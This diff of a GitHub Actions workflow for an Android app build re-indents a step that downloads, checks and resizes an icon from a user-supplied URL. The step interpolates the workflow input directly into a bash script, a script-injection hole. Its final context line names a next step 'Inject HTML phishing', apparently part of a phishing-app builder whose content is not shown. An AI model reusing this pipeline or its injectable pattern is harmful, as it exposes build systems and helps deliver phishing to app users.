@@ -148,61 +148,58 @@ jobs:
             echo "⚠️ New source folder tidak ada, tapi mungkin project pakai struktur lain"
           fi
 
-# ─── Set icon from URL ───
-- name: Set icon from URL
-  shell: bash
-  run: |
-    cd android
-    ICON_URL="${{ github.event.inputs.icon_url }}"
-    if [ -z "$ICON_URL" ]; then
-      echo "ℹ️ No icon provided, using default."
-      exit 0
-    fi
+      # ─── Set icon from URL ───
+      - name: Set icon from URL
+        shell: bash
+        run: |
+          cd android
+          ICON_URL="${{ github.event.inputs.icon_url }}"
+          if [ -z "$ICON_URL" ]; then
+            echo "ℹ️ No icon provided, using default."
+            exit 0
+          fi
 
-    # Cek kalau link masih link contoh
-    if [[ "$ICON_URL" == *"xxxxx"* ]]; then
-      echo "❌ ERROR: Kamu belum mengganti URL icon di aplikasi Flutter!"
-      exit 1
-    fi
+          if [[ "$ICON_URL" == *"xxxxx"* ]]; then
+            echo "❌ ERROR: URL icon masih link contoh (placeholder)!"
+            exit 1
+          fi
 
-    sudo apt-get update -qq
-    sudo apt-get install -y -qq imagemagick wget file
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq imagemagick wget file
 
-    echo "⬇️ Downloading icon from: $ICON_URL"
-    wget -q -O /tmp/custom_icon_raw "$ICON_URL" || curl -sL -A "Mozilla/5.0" "$ICON_URL" -o /tmp/custom_icon_raw
+          echo "⬇️ Downloading icon from: $ICON_URL"
+          wget -q -O /tmp/custom_icon_raw "$ICON_URL" || curl -sL -A "Mozilla/5.0" "$ICON_URL" -o /tmp/custom_icon_raw
 
-    if [ ! -s /tmp/custom_icon_raw ]; then
-      echo "❌ Gagal download icon dari URL (File kosong / 404)"
-      exit 1
-    fi
+          if [ ! -s /tmp/custom_icon_raw ]; then
+            echo "❌ Gagal download icon dari URL"
+            exit 1
+          fi
 
-    # Cek tipe file aslinya (biar tau itu gambar atau HTML)
-    FILE_TYPE=$(file -b --mime-type /tmp/custom_icon_raw)
-    echo "File type detected: $FILE_TYPE"
+          FILE_TYPE=$(file -b --mime-type /tmp/custom_icon_raw)
+          echo "File type detected: $FILE_TYPE"
 
-    if [[ "$FILE_TYPE" != image/* ]]; then
-      echo "❌ ERROR: URL yang kamu masukkan bukan gambar. File yang didownload berupa: $FILE_TYPE"
-      echo "💡 Pastikan link langsung mengarah ke file gambar (berakhiran .jpg/.png), bukan halaman web."
-      exit 1
-    fi
+          if [[ "$FILE_TYPE" != image/* ]]; then
+            echo "❌ ERROR: URL bukan gambar (Downloaded: $FILE_TYPE)"
+            exit 1
+          fi
 
-    echo "🖼️ Converting to PNG..."
-    convert /tmp/custom_icon_raw /tmp/custom_icon.png
+          echo "🖼️ Converting to PNG..."
+          convert /tmp/custom_icon_raw /tmp/custom_icon.png
 
-    for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
-      DIR="app/src/main/res/mipmap-$d"
-      mkdir -p "$DIR"
-      case $d in
-        mdpi)    SZ=48  ;;
-        hdpi)    SZ=72  ;;
-        xhdpi)   SZ=96  ;;
-        xxhdpi)  SZ=144 ;;
-        xxxhdpi) SZ=192 ;;
-      esac
-      convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher.png"
-      convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher_round.png" 2>/dev/null || true
-    done
-    echo "✅ Icons replaced"
+          for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
+            DIR="app/src/main/res/mipmap-$d"
+            mkdir -p "$DIR"
+            case $d in
+              mdpi)    SZ=48  ;;
+              hdpi)    SZ=72  ;;
+              xhdpi)   SZ=96  ;;
+              xxhdpi)  SZ=144 ;;
+              xxxhdpi) SZ=192 ;;
+            esac
+            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher.png"
+            convert /tmp/custom_icon.png -resize ${SZ}x${SZ} "$DIR/ic_launcher_round.png" 2>/dev/null || true
+          done
+          echo "✅ Icons replaced"
 
       # ─── Inject HTML phishing ───
       - name: Inject HTML content
